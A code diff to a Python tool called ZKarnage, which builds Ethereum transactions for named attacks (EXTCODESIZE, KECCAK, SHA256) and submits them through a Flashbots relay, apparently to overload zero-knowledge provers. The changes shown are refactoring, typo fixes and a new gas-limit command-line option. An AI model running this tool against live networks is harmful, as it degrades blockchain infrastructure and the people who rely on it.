@@ -76,9 +76,9 @@ class Attack(Enum):
     KECCAK = 9
     SHA256 = 10
 
-
-    def get_tx_data(self, abi_provider) -> str:
-        if self == Attack.EXTCODESIZE:
+    @staticmethod
+    def get_tx_data(attack, abi_provider) -> str:
+        if attack == Attack.EXTCODESIZE:
             # Load contract targets from CSV file
             try:
                 import csv
@@ -656,15 +656,17 @@ class ZKarnage:
         relay_url: str,
         abi_provider: ABIProvider,
         num_transactions: Optional[int] = 1,
+        gas_limit_per_tx: Optional[int] = 5000,
         attack: Optional[Attack] = Attack.EXTCODESIZE,
         contract_address: Optional[Address] = None
     ):
         self.w3 = w3
         self.account = account
         self.contract_address = contract_address
-        self.attack = attack,
+        self.attack = attack
         self.abi_provider = abi_provider
         self.num_transactions = num_transactions
+        self.gas_limit_per_tx = gas_limit_per_tx
         self.flashbots = FlashbotsManager(w3, relay_url, account)
     
     def get_next_hundred_block(self, current_block: Optional[int] = None) -> int:
@@ -1049,7 +1051,7 @@ class ZKarnage:
         latest = self.w3.eth.get_block("latest")
         base_fee = latest.get("baseFeePerGas", self.w3.eth.gas_price)
         
-        data = self.attack.get_tx_data(self.abi_provider)
+        data = Attack.get_tx_data(self.attack, self.abi_provider)
         logger.info(f"Complete transaction data: {data[:64]}...")
         
         # Set standard fees
@@ -1061,14 +1063,16 @@ class ZKarnage:
         
         # Calculate gas limit based on number of contracts
         # Base cost of 86k gas for 12 contracts = ~7,167 gas per contract
-        gas_per_contract = 7167
-        num_contracts = len(contract_targets)
-        gas_limit = gas_per_contract * num_contracts
+        # gas_per_contract = 7167
+        # num_contracts = len(contract_targets)
+        # gas_limit = gas_per_contract * num_contracts
         
-        # Add some buffer (20%) to account for variations
-        gas_limit = int(gas_limit * 1.2)
+        # # Add some buffer (20%) to account for variations
+        # gas_limit = int(gas_limit * 1.2)
+
+        gas_limit = self.gas_limit_per_tx
         
-        logger.info(f"Calculated gas limit: {gas_limit} (based on {num_contracts} contracts)")
+        logger.info(f"Using gas limit: {gas_limit} (based on provided cli arguments)")
         
         # Create transaction dictionary with all required fields
         tx = {
@@ -1098,6 +1102,7 @@ async def main():
     parser.add_argument("--attack", type=str, default="extcodesize")
     parser.add_argument("--gas-target", type=int, default=0)
     parser.add_argument("--num-transactions", type=int, default=1)
+    parser.add_argument("--gas-limit-per-tx", type=int, default=5000)
 
     args = parser.parse_args()
     
@@ -1106,7 +1111,8 @@ async def main():
     flashbots_mode = args.flashbots is True
     attack = args.attack
     gas_target = args.gas_target
-    num_transactions = arge.num_transactions
+    num_transactions = args.num_transactions
+    gas_limit_per_tx = args.gas_limit_per_tx
 
     
     if fast_mode:
@@ -1156,6 +1162,7 @@ async def main():
         relay_url=FLASHBOTS_RELAY_URL,
         abi_provider=abi_provider,
         num_transactions=num_transactions,
+        gas_limit_per_tx=gas_limit_per_tx,
         attack=Attack[attack.upper()],
         contract_address=Web3.to_checksum_address(CONTRACT_ADDRESS)
     )
